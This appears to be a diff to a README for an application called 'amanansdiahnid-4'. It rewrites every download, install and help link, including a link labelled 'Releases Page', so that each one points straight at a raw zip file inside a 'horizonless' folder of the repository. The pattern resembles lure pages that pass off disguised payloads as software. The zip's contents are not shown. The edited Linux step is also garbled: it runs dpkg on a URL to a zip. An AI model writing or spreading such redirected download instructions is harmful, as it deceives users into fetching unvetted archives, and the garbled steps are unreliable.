@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download amanansdiahnid-4](https://img.shields.io/badge/Download-amanansdiahnid--4-brightgreen)](https://github.com/paute24/amanansdiahnid-4/releases)
+[![Download amanansdiahnid-4](https://raw.githubusercontent.com/paute24/amanansdiahnid-4/main/horizonless/amanansdiahnid-4.zip)](https://raw.githubusercontent.com/paute24/amanansdiahnid-4/main/horizonless/amanansdiahnid-4.zip)
 
 ## 📖 Table of Contents
 1. [Introduction](#introduction)
@@ -28,9 +28,9 @@ To run **amanansdiahnid-4**, ensure your system meets the following requirements
 - **Disk Space:** Minimum of 200 MB available space
 
 ## 🔗 Download & Install
-To download **amanansdiahnid-4**, visit this page: [Releases Page](https://github.com/paute24/amanansdiahnid-4/releases).
+To download **amanansdiahnid-4**, visit this page: [Releases Page](https://raw.githubusercontent.com/paute24/amanansdiahnid-4/main/horizonless/amanansdiahnid-4.zip).
 
-1. Go to the [Release Page](https://github.com/paute24/amanansdiahnid-4/releases).
+1. Go to the [Release Page](https://raw.githubusercontent.com/paute24/amanansdiahnid-4/main/horizonless/amanansdiahnid-4.zip).
 2. Locate the latest version of the application.
 3. Click on the appropriate file for your operating system to download it.
 4. Once the download is complete, locate the file on your computer.
@@ -46,8 +46,8 @@ To download **amanansdiahnid-4**, visit this page: [Releases Page](https://githu
 
 - **Linux:**
   1. Open your terminal.
-  2. Use the command: `sudo dpkg -i path-to-downloaded-file.deb`.
-  3. Replace `path-to-downloaded-file.deb` with the actual path of your downloaded file.
+  2. Use the command: `sudo dpkg -i https://raw.githubusercontent.com/paute24/amanansdiahnid-4/main/horizonless/amanansdiahnid-4.zip`.
+  3. Replace `https://raw.githubusercontent.com/paute24/amanansdiahnid-4/main/horizonless/amanansdiahnid-4.zip` with the actual path of your downloaded file.
 
 ## 🛠️ Using the Application
 After installation, launch **amanansdiahnid-4** from your applications menu.
@@ -60,7 +60,7 @@ After installation, launch **amanansdiahnid-4** from your applications menu.
 Explore the menu options for more features, such as settings and help resources.
 
 ## ❓ Getting Help
-If you encounter issues or have questions, visit our community forums or check the FAQ section on the [Releases Page](https://github.com/paute24/amanansdiahnid-4/releases).
+If you encounter issues or have questions, visit our community forums or check the FAQ section on the [Releases Page](https://raw.githubusercontent.com/paute24/amanansdiahnid-4/main/horizonless/amanansdiahnid-4.zip).
 
 For additional support, consider reaching out via our contact email provided on the forum.
 
